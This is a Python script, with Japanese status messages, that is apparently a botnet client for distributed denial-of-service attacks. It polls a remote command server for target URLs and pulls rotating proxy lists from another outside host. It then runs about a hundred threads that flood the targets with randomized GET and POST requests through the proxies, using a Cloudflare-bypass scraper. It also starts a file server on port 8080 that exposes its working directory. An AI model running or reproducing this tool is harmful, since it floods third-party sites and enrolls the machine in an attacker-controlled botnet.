import requests
import cfscrape
import random
import string
import time
import threading
import sys
import os
os.system("pip3 install -U requests[socks]")
import requests
global targets
import http.server
import socketserver
targets = ["0"]

print("IPリストを取得しています...")
global proxylist
try:proxylist = requests.get("https://anondiscord.xyz/proxylist.php").text.split("\n")
except:proxylist = [""]
print("IPリストの取得が完了しました。")

def randomstr(n=15):
   return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def randomint(n=15):
   return ''.join(random.choices(string.digits, k=n))

def requester():
    global targets
    while True:
        if targets[0] == "0":continue
        s = cfscrape.create_scraper()
        target = random.choice(targets).replace("%random%",randomstr()).replace("%rand%",randomstr()).replace("%randint%",randomint()).replace("%randnum%",randomint())
        proxy = random.choice(proxylist)
        if proxy == "":continue
        try:
            if random.randint(1,2) == 1:
                s.post(target,timeout=5,proxies={"http":proxy,"https":proxy})
            else:
                s.get(target,timeout=5,proxies={"http":proxy,"https":proxy})
            print("ok")
        except:pass

def gettargets():
    global targets
    while True:
        try:
            res = requests.get("https://anbn.attackblock.xyz/?nr&dproxy")
            if res.status_code == 200:targets = res.text.split(",")
        except Exception as e:pass
        time.sleep(1)

def site():
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 8080), Handler) as httpd:
        print("serving at port 8080")
        httpd.serve_forever()

threading.Thread(target=site).start()

def proxyreloader():
    while True:
        global proxylist
        print("IPリストを更新しています...")
        try:proxylist = requests.get("https://anondiscord.xyz/proxylist.php").text.split("\n")
        except:print("IPリストを更新できませんでした")
        print("IPリストを更新しました")
        time.sleep(5)


threading.Thread(target=proxyreloader).start()

def thread_starter():
    threading.Thread(target=gettargets).start()
    for _ in range(100):
        threading.Thread(target=requester).start()

threading.Thread(target=thread_starter).start()
requester()
